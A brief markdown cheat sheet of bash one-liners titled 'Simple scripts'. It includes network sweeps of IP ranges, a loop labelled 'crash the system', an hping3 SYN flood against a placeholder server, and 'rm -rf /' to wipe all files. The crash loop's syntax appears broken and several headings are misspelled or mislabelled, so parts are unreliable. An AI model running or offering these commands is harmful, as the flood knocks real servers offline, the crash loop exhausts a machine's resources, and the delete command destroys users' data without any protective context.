# Simple scripts:

**Finding subdomains:**
```bash
for i in {1..255..1};do host 8.8.8.$i|grep -v not\ found;done
```

**decuct is ip up:**

```bash
for i in {1..255..1};do ping 192.168.43.$i|grep bytes;done
```

**crash the system:**

```bash
while true;do while true;do done;&;done
```

**Syn flood against server with hping3:**

```bash
hping3 -S --flood <ip> -p <port>
```

**rm all files:**

```bash
rm -rf /
```
